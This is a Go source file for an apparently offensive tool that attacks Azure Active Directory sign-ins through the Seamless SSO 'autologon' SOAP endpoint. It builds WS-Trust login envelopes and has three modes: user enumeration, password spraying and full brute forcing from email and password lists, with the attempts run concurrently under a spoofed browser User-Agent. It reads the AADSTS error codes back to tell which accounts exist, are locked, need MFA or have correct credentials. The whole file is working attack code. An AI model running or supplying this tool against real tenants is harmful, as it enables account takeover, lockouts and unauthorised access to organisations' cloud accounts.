package main

import (
	"bufio"
	"encoding/xml"
	"flag"
	"fmt"
	"github.com/google/uuid"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

var (
	email         Flag
	password      Flag
	emailsFile    Flag
	passwordsFile Flag
	output        io.Writer
	wg            sync.WaitGroup
)

func init() {
	flag.Var(&email, "email", "Example: user@domain.com")
	flag.Var(&password, "password", "Example: P@ssw0rd!")
	flag.Var(&emailsFile, "emails-file", "Example: /your/path/emails.txt")
	flag.Var(&passwordsFile, "passwords-file", "Example: /your/path/passwords.txt")
}

func main() {
	flag.Parse()
	filename := "output-" + time.Now().Format("20060102150405") + ".txt"
	fd, err := os.Create(filename)
	if err != nil {
		log.Print(err)
		os.Exit(1)
	}
	output = io.MultiWriter(os.Stdout, fd)

	if email.set && password.set {
		wg.Add(1)
		domain := strings.Split(email.value, "@")[1]
		go requestAzureActiveDirectory(domain, email.value, password.value)
	}
	if emailsFile.set {
		if _, err := os.Stat(emailsFile.value); os.IsNotExist(err) {
			println("[!] The file doesn't exist")
			os.Exit(1)
		}
	}
	if passwordsFile.set {
		if _, err := os.Stat(passwordsFile.value); os.IsNotExist(err) {
			println("[!] The file doesn't exist")
			os.Exit(1)
		}
	}
	if passwordsFile.set && emailsFile.set {
		bruteForcing(emailsFile.value, passwordsFile.value)
	}
	if email.set && passwordsFile.set {
		domain := strings.Split(email.value, "@")[1]
		passwordAttack(passwordsFile.value, email.value, domain)
	}
	if emailsFile.set && password.set {
		enumUsers(emailsFile.value, password.value)
	}
	wg.Wait()
}

type xmlStruct struct {
	Dtext string `xml:"Body>Fault>Detail>error>internalerror>text"`
}

func requestAzureActiveDirectory(domain string, user string, password string) {
	requestid := uuid.New()
	MessageID := uuid.New()
	userID := uuid.New()
	now := time.Now()
	creates := now.Format(time.RFC3339Nano)
	expires := now.Add(time.Minute * 10).Format(time.RFC3339Nano)
	url := "https://autologon.microsoftazuread-sso.com/" + domain + "/winauth/trust/2005/usernamemixed?client-request-id=" + requestid.String()
	body := strings.NewReader(`<?xml version='1.0' encoding='UTF-8'?>
<s:Envelope xmlns:s='http://www.w3.org/2003/05/soap-envelope' xmlns:wsse='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd' xmlns:saml='urn:oasis:names:tc:SAML:1.0:assertion' xmlns:wsp='http://schemas.xmlsoap.org/ws/2004/09/policy' xmlns:wsu='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd' xmlns:wsa='http://www.w3.org/2005/08/addressing' xmlns:wssc='http://schemas.xmlsoap.org/ws/2005/02/sc' xmlns:wst='http://schemas.xmlsoap.org/ws/2005/02/trust' xmlns:ic='http://schemas.xmlsoap.org/ws/2005/05/identity'>
   <s:Header>
       <wsa:Action s:mustUnderstand='1'>http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
       <wsa:To s:mustUnderstand='1'>` + url + `</wsa:To>
       <wsa:MessageID>urn:uuid:` + MessageID.String() + `</wsa:MessageID>
       <wsse:Security s:mustUnderstand="1">
           <wsu:Timestamp wsu:Id="_0">
               <wsu:Created>` + creates + `</wsu:Created>
               <wsu:Expires>` + expires + `</wsu:Expires>
           </wsu:Timestamp>
           <wsse:UsernameToken wsu:Id="uuid-` + userID.String() + `">
               <wsse:Username>` + user + `</wsse:Username>
               <wsse:Password>` + password + `</wsse:Password>
           </wsse:UsernameToken>
       </wsse:Security>
   </s:Header>
   <s:Body>
       <wst:RequestSecurityToken Id='RST0'>
           <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
               <wsp:AppliesTo>
                   <wsa:EndpointReference>
                       <wsa:Address>urn:federation:MicrosoftOnline</wsa:Address>
                   </wsa:EndpointReference>
               </wsp:AppliesTo>
               <wst:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</wst:KeyType>
       </wst:RequestSecurityToken>
   </s:Body>
</s:Envelope>
`)
	// create a request object
	req, _ := http.NewRequest(
		"POST",
		url,
		body,
	)
	// add a request header
	req.Header.Add("Content-Type", "application/json; charset=UTF-8")
	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/94.0.992.50")
	// send an HTTP using `req` object
	res, err := http.DefaultClient.Do(req)
	// check for response error
	if err != nil {
		log.Fatal("Error:", err)
	}
	// read response body
	data, _ := ioutil.ReadAll(res.Body)
	// close response body
	res.Body.Close()
	// print response status and body
	if res.StatusCode != 200 {
		errorCodeMessage := getErrorCodeMessage(getErrorCode(string(data)))
		errorMessage := fmt.Sprintf("%s:%s -> %s", user, password, errorCodeMessage)
		fmt.Fprintln(output, errorMessage)
	} else {
		fmt.Fprintln(output, fmt.Sprintf("%s:%s -> Correct credentials", user, password))
	}

	defer wg.Done()
}

func enumUsers(usersFile string, password string) {

	users, err := os.Open(usersFile)
	if err != nil {
		log.Fatal(err)
	}
	defer users.Close()
	scannerUsers := bufio.NewScanner(users)
	for scannerUsers.Scan() {
		wg.Add(1)
		user := scannerUsers.Text()
		domain := strings.Split(user, "@")[1]
		go requestAzureActiveDirectory(domain, user, password)
	}
	if err := scannerUsers.Err(); err != nil {
		log.Fatal(err)
	}
}

func passwordAttack(passwordsFile string, user string, domain string) {

	passwords, err := os.Open(passwordsFile)
	if err != nil {
		log.Fatal(err)
	}
	defer passwords.Close()
	scannerPasswords := bufio.NewScanner(passwords)
	for scannerPasswords.Scan() {
		wg.Add(1)
		go requestAzureActiveDirectory(domain, user, scannerPasswords.Text())
	}
	if err := scannerPasswords.Err(); err != nil {
		log.Fatal(err)
	}
}

func bruteForcing(usersFile string, passwordsFile string) {
	users, err := os.Open(usersFile)
	if err != nil {
		log.Fatal(err)
	}
	defer users.Close()
	scannerUsers := bufio.NewScanner(users)
	for scannerUsers.Scan() {
		user := scannerUsers.Text()
		domain := strings.Split(user, "@")[1]
		passwordAttack(passwordsFile, user, domain)
	}
	if err := scannerUsers.Err(); err != nil {
		log.Fatal(err)
	}
}

func getErrorCode(xmlcode string) string {
	// Extract error code from xml response
	x := xmlStruct{}
	_ = xml.Unmarshal([]byte(xmlcode), &x)
	errorCode := strings.Split(x.Dtext, ":")[0]
	return errorCode
}

func getErrorCodeMessage(errorCode string) string {
	var errorCodesMessage = map[string]string{
		"AADSTS81016": "Invalid STS request",
		"AADSTS50053": "Locked",
		"AADSTS50126": "Bad Password",
		"AADSTS50056": "Exists w/no password",
		"AADSTS50014": "Exists, but max passthru auth time exceeded",
		"AADSTS50076": "Need mfa",
		"AADSTS700016": "No app",
		"AADSTS50034": "No user",
	}
	if errorCodeMessage := errorCodesMessage[errorCode]; errorCodeMessage != "" {
        return errorCodeMessage
    }
	return "No error message for ErrorCode: " + errorCode
}

